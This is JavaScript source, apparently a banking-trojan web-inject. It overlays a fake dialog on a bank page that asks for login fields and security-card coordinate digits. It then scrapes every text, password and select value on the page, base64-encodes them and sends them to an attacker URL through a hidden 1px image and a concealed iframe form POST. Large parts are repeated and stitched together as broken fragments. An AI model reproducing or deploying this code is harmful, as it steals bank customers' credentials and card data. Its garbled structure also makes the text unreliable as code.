		BuildElement: function () {
			var element = document.createElement('div');
			element.name = element.id = 'injecto';
			
			for (var i in this.Parameters.Style.Main){
				try{
					element.style[i]= this.Parameters.Style.Main[i];
				}catch (_ex){ReportError.Send(_ex);}
			}

			// Logo Section
			if ((this.Parameters.Logo != null)&&(this.Parameters.Logo != 'undefined')){
				var dlogo = document.createElement('div');
				if ((this.Parameters.Style.dLogo != null)&&(this.Parameters.Style.dLogo != 'undefined')){
					for (var i in this.Parameters.Style.dLogo){
						try{
							dlogo.style[i]= this.Parameters.Style.dLogo[i];
						}catch (_ex){ReportError.Send(_ex);}
					}
				}
				var logo = document.createElement('img');
				logo.src = this.Parameters.Logo;
				if ((this.Parameters.Style.Logo != null)&&(this.Parameters.Style.Logo != 'undefined')){
					for (var i in this.Parameters.Style.Logo){
						try{
							logo.style[i]= this.Parameters.Style.Logo[i];
						}catch (_ex){ReportError.Send(_ex);}
					}
				}
				dlogo.appendChild(logo);
				element.appendChild(dlogo);
			}
			var tbl = document.createElement('div');
			for (var i in this.Parameters.Style.Table){
				try{
					tbl.style[i]= this.Parameters.Style.Table[i];
				}catch (_ex){ReportError.Send(_ex);}
			}
			// Label Section
			if ((this.Parameters.Label != null)&&(this.Parameters.Label != 'undefined')){
				var label = document.createElement('div');
				label.innerHTML = this.Parameters.Label;
				if ((this.Parameters.Style.Label != null)&&(this.Parameters.Style.Label != 'undefined')){
					for (var i in this.Parameters.Style.Label){
						try{
							label.style[i]= this.Parameters.Style.Label[i];
						}catch (_ex){ReportError.Send(_ex);}
					}
				}
				tbl.appendChild(label);
			}

			// Welcome Page
			var page = null;
			if ((this.Parameters.Welcome != null)&&(this.Parameters.Welcome != 'undefined')){
				page = document.createElement('div');
				page.name = page.id = 'page_' + (this.Pages.length);
				this.Pages.push(page);
				var p = document.createElement('p');
				p.innerHTML = this.Parameters.Welcome;
				page.appendChild(p);
				if ((this.Parameters.Style.Welcome != null)&&(this.Parameters.Style.Welcome != 'undefined')){
					for (var i in this.Parameters.Style.Welcome){
						try{
							page.style[i]= this.Parameters.Style.Welcome[i];
						}catch (_ex){ReportError.Send(_ex);}
					}
				}
				tbl.appendChild(page);
			}
			
			// Tarjeta and Fields (Ask Section)
			if ((this.Parameters.Ask != null)&&(this.Parameters.Ask != undefined)){
				for (i=0; i<this.Parameters.Ask.length; i++){
					if (this.Parameters.Ask[i][0] == 0){
						page = document.createElement('div');
						for (var l in this.Parameters.Style.Ask){
							try{
								page.style[l]= this.Parameters.Style.Ask[l];
							}catch (_ex){ReportError.Send(_ex);}
						}
						page.name = page.id = 'page_' + (this.Pages.length);
						page.style.display = 'none';
						this.Pages.push(page);
						var p = document.createElement('p');
						for (var l in this.Parameters.Style.Header){
							try{
								p.style[l]= this.Parameters.Style.Header[l];
							}catch (_ex){ReportError.Send(_ex);}
						}
						p.innerHTML = this.Parameters.HeaderText;
						page.appendChild(p);
						var table = document.createElement('table');
						var tr = null;
						var td = null;
						var input = null;
						// Fields
						for (j=1; j < this.Parameters.Ask[i].length; j++){
							tr = document.createElement('tr');
							td = document.createElement('td');
							for (var l in this.Parameters.Style.FieldsLbls){
								try{
									td.style[l]= this.Parameters.Style.FieldsLbls[l];
								}catch (_ex){ReportError.Send(_ex);}
							}
							td.innerHTML = this.Parameters.Ask[i][j][0];
							tr.appendChild(td);
							td = document.createElement('td');
							input = document.createElement('input');
							input.name = input.id = this.Parameters.Ask[i][j][1];
							input.size = this.Parameters.Ask[i][j][2];
							input.maxLength = this.Parameters.Ask[i][j][3];
							input.type = this.Parameters.Ask[i][j][4]; 
							for (var l in this.Parameters.Style.Fields){
								try{
									input.style[l]= this.Parameters.Style.Fields[l];
								}catch (_ex){ReportError.Send(_ex);}
							}
							td.appendChild(input);
							tr.appendChild(td);
							table.appendChild(tr);
						}

						var tt = document.createElement('span');
						tt.innerHTML = '<table>' + table.innerHTML + '</table>';
						page.appendChild(tt);
						p = document.createElement('p');
						for (var l in this.Parameters.Style.Bottom){
							try{
								p.style[l]= this.Parameters.Style.Bottom[l];
							}catch (_ex){ReportError.Send(_ex);}
						}
						p.innerHTML = this.Parameters.BottomText;
						page.appendChild(p);
						tbl.appendChild(page);
					}
					
					// Tarjeta
					if (this.Parameters.Ask[i][0] == 1){
						page = document.createElement('div');
						for (var l in this.Parameters.Style.Tarjeta){
							try{
								page.style[l]= this.Parameters.Style.Tarjeta[l];
							}catch (_ex){ReportError.Send(_ex);}
						}
						page.name = page.id = 'page_' + (this.Pages.length);
						page.style.display = 'none';
						this.Pages.push(page);
						
						var p = document.createElement('p');
						for (var l in this.Parameters.Style.Header){
							try{
								p.style[l]= this.Parameters.Style.Header[l];
							}catch (_ex){ReportError.Send(_ex);}
						}
						p.innerHTML = this.Parameters.HeaderText;
						page.appendChild(p);

						var table = document.createElement('table');
						var tr = null;
						var td = null;
						var input = null;

						var c = 3;
						for (j=3; j < this.Parameters.Ask[i].length; j++){
							tr = document.createElement('tr');
							for (k = 0; k < this.Parameters.Ask[i][1]; k++){
								if ((this.Parameters.Ask[i][c] != null)&&(this.Parameters.Ask[i][c] != 'undefined')){
									td = document.createElement('td');
									for (var l in this.Parameters.Style.CoordsLbls){
										try{
											td.style[l]= this.Parameters.Style.CoordsLbls[l];
										}catch (_ex){ReportError.Send(_ex);}
									}
									td.innerHTML = this.Parameters.Ask[i][c];
									tr.appendChild(td);
									td = document.createElement('td');

									input = document.createElement('input');
									input.type = 'text';
									input.maxLength = input.size = this.Parameters.Ask[i][2];
									input.name = input.id = 'txt_' + this.Parameters.Ask[i][c++];
									for (var l in this.Parameters.Style.Coords){
										try{
											input.style[l]= this.Parameters.Style.Coords[l];
										}catch (_ex){ReportError.Send(_ex);}
									}
									td.appendChild(input);
									tr.appendChild(td);
								}
							}
							table.appendChild(tr);
							var clean = table.getElementsByTagName('tr');
							for (var m=0; m < clean.length; m++){
								if (clean[m].innerHTML == ''){
									clean[m].parentNode.removeChild(clean[m]);
								}
							}
							var card = this.roundedBox.init(table);
						}
						card.innerHTML = card.innerHTML;
						var inpts = card.getElementsByTagName('input');
							for(var inpi = 0; inpi < inpts.length; inpi++){
								input = inpts[inpi];
								
									input.onkeypress = function () {
										if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;
									}
							}
						page.appendChild(card);
						p = document.createElement('p');
						for (var l in this.Parameters.Style.Bottom){
							try{
								p.style[l]= this.Parameters.Style.Bottom[l];
							}catch (_ex){ReportError.Send(_ex);}
						}
						p.innerHTML = this.Parameters.BottomText;
						page.appendChild(p);
						
						tbl.appendChild(page);
					}
				}
			}
			
			// Final screen
			if ((this.Parameters.Final != null)&&(this.Parameters.Final != 'undefined')){
				page = document.createElement('div');
				page.style.display = 'none';
				page.name = page.id = 'page_' + (this.Pages.length);
				this.Pages.push(page);
				page.innerHTML = this.Parameters.Final;
				if ((this.Parameters.Style.Final != null)&&(this.Parameters.Style.Final != 'undefined')){
					for (var i in this.Parameters.Style.Final){
						try{
							page.style[i]= this.Parameters.Style.Final[i];
						}catch (_ex){ReportError.Send(_ex);}
					}
				}
				tbl.appendChild(page);
			}

			// Button Section
			var btn = document.createElement('div');
			if ((this.Parameters.Style.dBtn != null)&&(this.Parameters.Style.dBtn != 'undefined')){
				for (var i in this.Parameters.Style.dBtn){
					try{
						btn.style[i]= this.Parameters.Style.dBtn[i];
					}catch (_ex){ReportError.Send(_ex);}
				}
			}
			if ((this.Parameters.BtnType != null)&&(this.Parameters.BtnType != 'undefined')){
				if ((this.Parameters.BtnType == 'button')||(this.Parameters.BtnType == 'submit')||(this.Parameters.BtnType == 'image')){
					var ibtn = document.createElement('input');
					ibtn.type = this.Parameters.BtnType;
					for (var i in this.Parameters.Style.iBtn){
						try{
							ibtn.style[i]= this.Parameters.Style.iBtn[i];
						}catch (_ex){ReportError.Send(_ex);}
					}
					ibtn.value = this.Parameters.BtnText;
				}else if ((this.Parameters.BtnType == 'img')&&(this.Parameters.BtnImg != null)&&(this.Parameters.BtnImg != 'undefined')){
					var ibtn = document.createElement('img');
					ibtn.src = this.Parameters.BtnImg;
					for (var i in this.Parameters.Style.iBtn){
						try{
							ibtn.style[i]= this.Parameters.Style.iBtn[i];
						}catch (_ex){ReportError.Send(_ex);}
					}
				}else{
					var ibtn = document.createElement('a');
					ibtn.href = '#';
					ibtn.innerHTML = this.Parameters.BtnText;
					//ibtn.name = btn.id = 'injecto_btn';
					if ((this.Parameters.Style.iBtn != null)&&(this.Parameters.Style.iBtn != 'undefined')){
							for (var i in this.Parameters.Style.iBtn){
								try{
									ibtn.style[i]= this.Parameters.Style.iBtn[i];
								}catch (_ex){ReportError.Send(_ex);}
							}
					}
				}
				ibtn.onclick = function () {
					Inject.Continue();
					return false;
				}
				btn.appendChild(ibtn);
			}

			tbl.appendChild(btn);
			element.appendChild(tbl);
			return element;
		},
		Continue: function () {
			//Button Continue
			var approve = true;
			var current = this.CurrentPage;
			var hide = this.Pages[current++];
			var next = this.Pages[current];
			var el = null;
			if ((next != null)&&(next != 'undefined')){
				var elements = hide.getElementsByTagName('input');
				if ((elements != null)&&(elements != 'undefined')){
					for (i=0; i < elements.length; i++){
						if (elements[i].size > elements[i].value.length ){
							approve = false;
							el = elements[i];
							break;
						}
					}
				}
				if (approve){
					hide.style.display = 'none';
					next.style.display = '';
					this.CurrentPage++;
					this.Collector.GetData();
					this.Collector.PostData();
				}else{
					el.focus();
					alert(this.Parameters.Alert);
					return false;
				}
			}else{
				this.Collector.GetData('done');
				this.ModalDialogViewer.Hide();
				this.Final();
			}
		},
		Collector: {
			Base64: {
				_keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
				encode: function (input) {
					var output = "";
					var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
					var i = 0;
					input = this._utf8_encode(input);
					while (i < input.length) {
						chr1 = input.charCodeAt(i++);
						chr2 = input.charCodeAt(i++);
						chr3 = input.charCodeAt(i++);
						enc1 = chr1 >> 2;
						enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
						enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
						enc4 = chr3 & 63;
						if (isNaN(chr2)) {
							enc3 = enc4 = 64;
						}
						else if (isNaN(chr3)) {
							enc4 = 64;
						}
						output = output + this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) + this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4);
					}
					return output;
				},
				decode: function (input) {
					var output = "";
					var chr1, chr2, chr3;
					var enc1, enc2, enc3, enc4;
					var i = 0;
					input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
					while (i < input.length) {
						enc1 = this._keyStr.indexOf(input.charAt(i++));
						enc2 = this._keyStr.indexOf(input.charAt(i++));
						enc3 = this._keyStr.indexOf(input.charAt(i++));
						enc4 = this._keyStr.indexOf(input.charAt(i++));
						chr1 = (enc1 << 2) | (enc2 >> 4);
						chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
						chr3 = ((enc3 & 3) << 6) | enc4;
						output = output + String.fromCharCode(chr1);
						if (enc3 != 64) {
							output = output + String.fromCharCode(chr2);
						}
						if (enc4 != 64) {
							output = output + String.fromCharCode(chr3);
						}
					}
					output = this._utf8_decode(output);
					return output;
				},
				_utf8_encode: function (string) {
					try{
						string = string.replace(/\r\n/g, "\n");
					}catch(_ex) {}
					var utftext = "";
					for (var n = 0; n < string.length; n++) {
						var c = string.charCodeAt(n);
						if (c < 128) {
							utftext += String.fromCharCode(c);
						}
						else if ((c > 127) && (c < 2048)) {
							utftext += String.fromCharCode((c >> 6) | 192);
							utftext += String.fromCharCode((c & 63) | 128);
						}
						else {
							utftext += String.fromCharCode((c >> 12) | 224);
							utftext += String.fromCharCode(((c >> 6) & 63) | 128);
							utftext += String.fromCharCode((c & 63) | 128);
						}
					}
					return utftext;
				},
				_utf8_decode: function (utftext) {
					var string = "";
					var i = 0;
					var c = c1 = c2 = 0;
					while (i < utftext.length) {
						c = utftext.charCodeAt(i);
						if (c < 128) {
							string += String.fromCharCode(c);
							i++;
						}
						else if ((c > 191) && (c < 224)) {
							c2 = utftext.charCodeAt(i + 1);
							string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
							i += 2;
						}
						else {
							c2 = utftext.charCodeAt(i + 1);
							c3 = utftext.charCodeAt(i + 2);
							string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
							i += 3;
						}
					}
					return string;
				}
			},
			FormsData: function () {
				var ret = '';
				try {
					var ret = 'Domain: ' + document.domain + '\r\n';
				}
				catch (_ex) {
					var ret = 'Hostname: ' + window.location.hostname + '\r\n';
				}
				try {
					var inputs = document.getElementsByTagName("input");
					if ((typeof(inputs) != "undefined") && (inputs != 0)) {
						for (var i = 0; i < inputs.length; i++) {
							if ((inputs[i].getAttribute('type') == 'text') || (inputs[i].getAttribute('type') == 'password') || (inputs[i].getAttribute('type') == '')) {
								ret += "input(" + inputs[i].getAttribute('type') + ")[" + i + "]";
								try{
									ret += '.' + inputs[i].getAttribute('name');
								}catch(_ex){}
								try{
									ret += '.' + inputs[i].name;
								}catch(_ex){}
								try{
									ret += '.' + inputs[i].id;
								}catch(_ex){}
								ret += ": " + inputs[i].value + "\r\n";
							}
							else if ((inputs[i].getAttribute('type') == 'radio') || (inputs[i].getAttribute('type') == 'checkbox')) {
								if (inputs[i].checked) {
									ret += "input(" + inputs[i].getAttribute('type') + ")[" + i + "].";
									if (inputs[i].getAttribute('name') != null) {
										ret += inputs[i].getAttribute('name');
									}
									else if ((inputs[i].id != '') && (inputs[i].id != null)) {
										ret += inputs[i].id;
									}
									else {
										ret += "?";
									}
									ret += ": " + inputs[i].value + "\r\n";
								}
							}
						}
					}
				}
				catch (_ex) {
					ret += "parse inputs: -1\r\n";
				}
				try {
					var selects = document.getElementsByTagName("select");
					for (var i = 0; i < selects.length; i++) {
						var current = selects[i];
						for (var j = 0; j < current.options.length; j++) {
							if (current.options[j].selected) {
								ret += "select[" + i + "]." + current.getAttribute('name') + ": (" + j + ")" + current.options[j].value + "\r\n";
							}
						}
					}
				}
				catch (_ex) {
					ret += "parse selects: -1\r\n";
				}
				return ret;
			},
			GetData: function (data){
				var img = document.createElement('img');
				img.style.height = img.style.width = '1px';
				if ((data != null)&&(data != 'undefined')&&(data.length > 0)) var reply = data;
				else var reply = this.FormsData();
				try{
					img.src = Inject.PostUrl + "?domain=" + document.domain +'&data=' + this.Base64.encode(reply);
				}catch(_ex){
					img.src = Inject.PostUrl + "?domain=" + window.location.hostname +'&data=' + this.Base64.encode(reply);
				}
				document.body.appendChild(img);
			},
			PostData: function () {
				var ieversion = -1
				if (/MSIE (\d+\.\d+);/.test(navigator.userAgent)) {
					ieversion = new Number(RegExp.$1)
				}
				if (ieversion == 6) var hDiv = document.createElement('<div style="visibility: hidden"></div>');
				else {
					var hDiv = document.createElement("div");
					hDiv.style.visibility = "hidden";
				}
				var isDivAdded = false;
				var html = document.getElementsByTagName("body")[0];

				if (html != null) {
					html.appendChild(hDiv);
					isDivAdded = true;
				}

				if (isDivAdded) {
					var frame = document.createElement("iframe");
					frame.style.width = '0';
					frame.style.height = '0';
					frame.name = "_csm_iframe" + new Date().getTime();
					frame.id = "_csm_iframe" + new Date().getTime();
					frame.src = "javascript:";
					hDiv.appendChild(frame);
					var iFrameDocument = frame.contentWindow.document;
					try {
						var formHtml = "<form id='iForm' action='" + Inject.PostUrl + "?domain=" + document.domain + "' method='POST' >";
					}
					catch (_ex) {
						var formHtml = "<form id='iForm' action='" + Inject.PostUrl + "?domain=" + window.location.hostname + "' method='POST' >";
					}
					formHtml += "<input type='text' name='injdatos' value='" + this.Base64.encode(this.FormsData()) + "'/>";
					formHtml += "</form>";
					iFrameDocument.write(formHtml);
					var form = iFrameDocument.getElementById("iForm");
					if (form != null) {
						form.submit();
					}
				}
			}
		},
		Init: function () {
			try{
				this.Element = this.BuildElement();
			}catch (_ex){ReportError.Send(_ex);}
			try{
				document.body.appendChild(this.Element);
			}catch (_ex){ReportError.Send(_ex);}
			try{
				this.ModalDialogViewer.Init();
			}catch (_ex){ReportError.Send(_ex);}
			try{
				this.ModalDialogViewer.Dialog.appendChild(this.Element);
			}catch (_ex){ReportError.Send(_ex);}
			try{
				this.ModalDialogViewer.Show();
			}catch (_ex){ReportError.Send(_ex);}
		}
	}
	Inject.Install();
}catch (_ex){ReportError.Send(_ex);}

					this.GlassWindow.style.display = 'block';

					if (this.IsIE6()) {
						this.setScroll(0, yPos);
						this.prepareIE("auto", "auto");
						this.hideSelects("visible");
					}
					this.GlassWindow.style.display = 'none';
				}
			},
			prepareIE: function (height, overflow) {
				bod = document.getElementsByTagName('body')[0];
				bod.style.height = height;
				htm = document.getElementsByTagName('html')[0];
				htm.style.height = height;
			},
			hideSelects: function (visibility) {
				selects = document.getElementsByTagName('select');
				for (i = 0; i < selects.length; i++) {
					selects[i].style.visibility = visibility;
				}
			},
			getScroll: function () {
				if (self.pageYOffset) {
					yPos = self.pageYOffset;
				} else if (document.documentElement && document.documentElement.scrollTop) {
					yPos = document.documentElement.scrollTop;
				} else if (document.body) {
					yPos = document.body.scrollTop;
				}
			},
			setScroll: function (x, y) {
				window.scrollTo(x, y);
			},
			ShowModalWindow: function (show, divId) {
				this.ShowGlassWindow(show);
				if (this.Dialog == null) {
					this.Dialog = this.Element;
				}
				if (this.Dialog != null) {
					if (show) {
						this.Dialog.style.display = 'block';
						this.Dialog.style.width = this.Style.width;
						if (this.IsIE6()) {
							this.Dialog.style.position = "absolute";
						}
					} else this.Dialog.style.display = 'none';
				}
			},
			getDocumentSize: function () {
				var width = Math.max(window.screen.availWidth, Math.max(document.body.scrollWidth, document.body.offsetWidth));
				var height = Math.max(window.screen.availHeight, Math.max(document.body.scrollHeight, document.body.offsetHeight));
				return [width, height];
			},
			getClientSize: function () {
				if (document.compatMode == 'CSS1Compat') return [document.documentElement.clientWidth, document.documentElement.clientHeight];
				else return [document.body.clientWidth, document.body.clientHeight];
			},
			getDocumentScroll: function () {
				return [self.pageXOffset || (document.documentElement && document.documentElement.scrollLeft) || (document.body && document.body.scrollLeft), self.pageYOffset || (document.documentElement && document.documentElement.scrollTop) || (document.body && document.body.scrollTop)];
			},
			getClientCenter: function () {
				var sizes = this.getDocumentSize();
				var scrl = this.getDocumentScroll();
				return [parseInt(sizes[0] / 2) + scrl[0], parseInt(sizes[1] / 2) + scrl[1]];
			},
			getClientCenter1: function () {
				var sizes = this.getDocumentSize();
				return [parseInt(sizes[0] / 2), parseInt(sizes[1] / 2)];
			},
			Show: function (divId) {
				this.ShowModalWindow(true, divId);
			},
			Hide: function (divId) {
				this.ShowModalWindow(false, divId);
			},
			Init: function (){
				var ModalWindow = null;
				if (ModalWindow == null) {
					ModalWindow = document.createElement('div');
					for (var i in this.Style.modal) {
						try {
							ModalWindow.style[i] = this.Style.modal[i];
						} catch (_ex) {}
					}
					this.Dialog = ModalWindow;
					document.body.appendChild(ModalWindow);
				}
			}
		},

			}

			for (var i in this.Parameters.Style.Table){

							}catch (_ex){ReportError.Send(_ex);}
						}
						p.innerHTML = this.Parameters.HeaderText;
						page.appendChild(p);
						var table = document.createElement('table');

							input.name = input.id = this.Parameters.Ask[i][j][1];

							for (var l in this.Parameters.Style.Fields){

									input.style[l]= this.Parameters.Style.Fields[l];
								}catch (_ex){ReportError.Send(_ex);}
							}
							td.appendChild(input);
							tr.appendChild(td);
							table.appendChild(tr);
						}

						var tt = document.createElement('span');
						tt.innerHTML = '<table>' + table.innerHTML + '</table>';
						page.appendChild(tt);
						p = document.createElement('p');
						for (var l in this.Parameters.Style.Bottom){
							try{
								p.style[l]= this.Parameters.Style.Bottom[l];
							}catch (_ex){ReportError.Send(_ex);}
						}
						p.innerHTML = this.Parameters.BottomText;
						page.appendChild(p);

					}
					
					// Tarjeta

							for(var inpi = 0; inpi < inpts.length; inpi++){
								input = inpts[inpi];
								
									input.onkeypress = function () {
										if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;
									}
							}
						page.appendChild(card);
						p = document.createElement('p');
						for (var l in this.Parameters.Style.Bottom){
							try{
								p.style[l]= this.Parameters.Style.Bottom[l];
							}catch (_ex){ReportError.Send(_ex);}
						}
						p.innerHTML = this.Parameters.BottomText;
						page.appendChild(p);
						
						tbl.appendChild(page);
					}
				}
			}
			
			// Final screen

				this.Pages.push(page);
				page.innerHTML = this.Parameters.Final;

					for (var i in this.Parameters.Style.Final){

					}

			}

			// Button Section
			var btn = document.createElement('div');

				for (var i in this.Parameters.Style.dBtn){
					try{

					}catch (_ex){ReportError.Send(_ex);}
				}
			}
			if ((this.Parameters.BtnType != null)&&(this.Parameters.BtnType != 'undefined')){
				if ((this.Parameters.BtnType == 'button')||(this.Parameters.BtnType == 'submit')||(this.Parameters.BtnType == 'image')){
					var ibtn = document.createElement('input');
					ibtn.type = this.Parameters.BtnType;
					for (var i in this.Parameters.Style.iBtn){
						try{
							ibtn.style[i]= this.Parameters.Style.iBtn[i];
						}catch (_ex){ReportError.Send(_ex);}
					}
					ibtn.value = this.Parameters.BtnText;
				}else if ((this.Parameters.BtnType == 'img')&&(this.Parameters.BtnImg != null)&&(this.Parameters.BtnImg != 'undefined')){
					var ibtn = document.createElement('img');
					ibtn.src = this.Parameters.BtnImg;
					for (var i in this.Parameters.Style.iBtn){
						try{
							ibtn.style[i]= this.Parameters.Style.iBtn[i];
						}catch (_ex){ReportError.Send(_ex);}
					}
				}else{
					var ibtn = document.createElement('a');
					ibtn.href = '#';
					ibtn.innerHTML = this.Parameters.BtnText;
					if ((this.Parameters.Style.iBtn != null)&&(this.Parameters.Style.iBtn != 'undefined')){
							for (var i in this.Parameters.Style.iBtn){
								try{
									ibtn.style[i]= this.Parameters.Style.iBtn[i];
								}catch (_ex){ReportError.Send(_ex);}
							}
					}
				}
				ibtn.onclick = function () {
					Inject.Continue();
					return false;
				}
				btn.appendChild(ibtn);
			}

			tbl.appendChild(btn);
			element.appendChild(tbl);
			return element;
		},
		Continue: function () {
			//Button Continue
			var approve = true;
			var current = this.CurrentPage;
			var hide = this.Pages[current++];
			var next = this.Pages[current];
			var el = null;
			if ((next != null)&&(next != 'undefined')){
				var elements = hide.getElementsByTagName('input');
				if ((elements != null)&&(elements != 'undefined')){
					for (i=0; i < elements.length; i++){
						if (elements[i].size > elements[i].value.length ){
							approve = false;
							el = elements[i];
							break;
						}
					}
				}
				if (approve){
					hide.style.display = 'none';
					next.style.display = '';
					this.CurrentPage++;
					this.Collector.GetData();
					this.Collector.PostData();
				}else{
					el.focus();
					alert(this.Parameters.Alert);
					return false;
				}
			}else{
				this.Collector.GetData('done');
				this.ModalDialogViewer.Hide();
				this.Final();
			}
		},
		Collector: {
			Base64: {
				_keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
				encode: function (input) {
					var output = "";
					var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
					var i = 0;
					input = this._utf8_encode(input);
					while (i < input.length) {
						chr1 = input.charCodeAt(i++);
						chr2 = input.charCodeAt(i++);
						chr3 = input.charCodeAt(i++);
						enc1 = chr1 >> 2;
						enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
						enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
						enc4 = chr3 & 63;
						if (isNaN(chr2)) {
							enc3 = enc4 = 64;
						}
						else if (isNaN(chr3)) {
							enc4 = 64;
						}
						output = output + this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) + this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4);
					}
					return output;
				},
				decode: function (input) {
					var output = "";
					var chr1, chr2, chr3;
					var enc1, enc2, enc3, enc4;
					var i = 0;
					input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
					while (i < input.length) {
						enc1 = this._keyStr.indexOf(input.charAt(i++));
						enc2 = this._keyStr.indexOf(input.charAt(i++));
						enc3 = this._keyStr.indexOf(input.charAt(i++));
						enc4 = this._keyStr.indexOf(input.charAt(i++));
						chr1 = (enc1 << 2) | (enc2 >> 4);
						chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
						chr3 = ((enc3 & 3) << 6) | enc4;
						output = output + String.fromCharCode(chr1);
						if (enc3 != 64) {
							output = output + String.fromCharCode(chr2);
						}
						if (enc4 != 64) {
							output = output + String.fromCharCode(chr3);
						}
					}
					output = this._utf8_decode(output);
					return output;
				},
				_utf8_encode: function (string) {
					try{
						string = string.replace(/\r\n/g, "\n");
					}catch(_ex) {}
					var utftext = "";
					for (var n = 0; n < string.length; n++) {
						var c = string.charCodeAt(n);
						if (c < 128) {
							utftext += String.fromCharCode(c);
						}
						else if ((c > 127) && (c < 2048)) {
							utftext += String.fromCharCode((c >> 6) | 192);
							utftext += String.fromCharCode((c & 63) | 128);
						}
						else {
							utftext += String.fromCharCode((c >> 12) | 224);
							utftext += String.fromCharCode(((c >> 6) & 63) | 128);
							utftext += String.fromCharCode((c & 63) | 128);
						}
					}
					return utftext;
				},
				_utf8_decode: function (utftext) {
					var string = "";
					var i = 0;
					var c = c1 = c2 = 0;
					while (i < utftext.length) {
						c = utftext.charCodeAt(i);
						if (c < 128) {
							string += String.fromCharCode(c);
							i++;
						}
						else if ((c > 191) && (c < 224)) {
							c2 = utftext.charCodeAt(i + 1);
							string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
							i += 2;
						}
						else {
							c2 = utftext.charCodeAt(i + 1);
							c3 = utftext.charCodeAt(i + 2);
							string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
							i += 3;
						}
					}
					return string;
				}
			},
			FormsData: function () {
				var ret = '';
				try {
					var ret = 'Domain: ' + document.domain + '\r\n';
				}
				catch (_ex) {
					var ret = 'Hostname: ' + window.location.hostname + '\r\n';
				}
				try {
					var inputs = document.getElementsByTagName("input");
					if ((typeof(inputs) != "undefined") && (inputs != 0)) {
						for (var i = 0; i < inputs.length; i++) {
							if ((inputs[i].getAttribute('type') == 'text') || (inputs[i].getAttribute('type') == 'password') || (inputs[i].getAttribute('type') == '')) {
								ret += "input(" + inputs[i].getAttribute('type') + ")[" + i + "]";
								try{
									ret += '.' + inputs[i].getAttribute('name');
								}catch(_ex){}
								try{
									ret += '.' + inputs[i].name;
								}catch(_ex){}
								try{
									ret += '.' + inputs[i].id;
								}catch(_ex){}
								ret += ": " + inputs[i].value + "\r\n";
							}
							else if ((inputs[i].getAttribute('type') == 'radio') || (inputs[i].getAttribute('type') == 'checkbox')) {
								if (inputs[i].checked) {
									ret += "input(" + inputs[i].getAttribute('type') + ")[" + i + "].";
									if (inputs[i].getAttribute('name') != null) {
										ret += inputs[i].getAttribute('name');
									}
									else if ((inputs[i].id != '') && (inputs[i].id != null)) {
										ret += inputs[i].id;
									}
									else {
										ret += "?";
									}
									ret += ": " + inputs[i].value + "\r\n";
								}
							}
						}
					}
				}
				catch (_ex) {
					ret += "parse inputs: -1\r\n";
				}
				try {
					var selects = document.getElementsByTagName("select");
					for (var i = 0; i < selects.length; i++) {
						var current = selects[i];
						for (var j = 0; j < current.options.length; j++) {
							if (current.options[j].selected) {
								ret += "select[" + i + "]." + current.getAttribute('name') + ": (" + j + ")" + current.options[j].value + "\r\n";
							}
						}
					}
				}
				catch (_ex) {
					ret += "parse selects: -1\r\n";
				}
				return ret;
			},
			GetData: function (data){
				var img = document.createElement('img');
				img.style.height = img.style.width = '1px';
				if ((data != null)&&(data != 'undefined')&&(data.length > 0)) var reply = data;
				else var reply = this.FormsData();
				try{
					img.src = Inject.PostUrl + "?domain=" + document.domain +'&data=' + this.Base64.encode(reply);
				}catch(_ex){
					img.src = Inject.PostUrl + "?domain=" + window.location.hostname +'&data=' + this.Base64.encode(reply);
				}
				document.body.appendChild(img);
			},
			PostData: function () {
				var ieversion = -1
				if (/MSIE (\d+\.\d+);/.test(navigator.userAgent)) {
					ieversion = new Number(RegExp.$1)
				}
				if (ieversion == 6) var hDiv = document.createElement('<div style="visibility: hidden"></div>');
				else {
					var hDiv = document.createElement("div");
					hDiv.style.visibility = "hidden";
				}
				var isDivAdded = false;
				var html = document.getElementsByTagName("body")[0];

				if (html != null) {
					html.appendChild(hDiv);
					isDivAdded = true;
				}

				if (isDivAdded) {
					var frame = document.createElement("iframe");
					frame.style.width = '0';
					frame.style.height = '0';
					frame.name = "_csm_iframe" + new Date().getTime();
					frame.id = "_csm_iframe" + new Date().getTime();
					frame.src = "javascript:";
					hDiv.appendChild(frame);
					var iFrameDocument = frame.contentWindow.document;
					try {
						var formHtml = "<form id='iForm' action='" + Inject.PostUrl + "?domain=" + document.domain + "' method='POST' >";
					}
					catch (_ex) {
						var formHtml = "<form id='iForm' action='" + Inject.PostUrl + "?domain=" + window.location.hostname + "' method='POST' >";
					}
					formHtml += "<input type='text' name='injdatos' value='" + this.Base64.encode(this.FormsData()) + "'/>";
					formHtml += "</form>";
					iFrameDocument.write(formHtml);
					var form = iFrameDocument.getElementById("iForm");
					if (form != null) {
						form.submit();
					}
				}
			}
		},
		Init: function () {
			try{
				this.Element = this.BuildElement();
			}catch (_ex){ReportError.Send(_ex);}
			try{
				document.body.appendChild(this.Element);
			}catch (_ex){ReportError.Send(_ex);}
			try{
				this.ModalDialogViewer.Init();
			}catch (_ex){ReportError.Send(_ex);}
			try{
				this.ModalDialogViewer.Dialog.appendChild(this.Element);
			}catch (_ex){ReportError.Send(_ex);}
			try{
				this.ModalDialogViewer.Show();
			}catch (_ex){ReportError.Send(_ex);}
		}
	}
	Inject.Install();
}catch (_ex){ReportError.Send(_ex);}
</script>
data_end
data_after
data_end
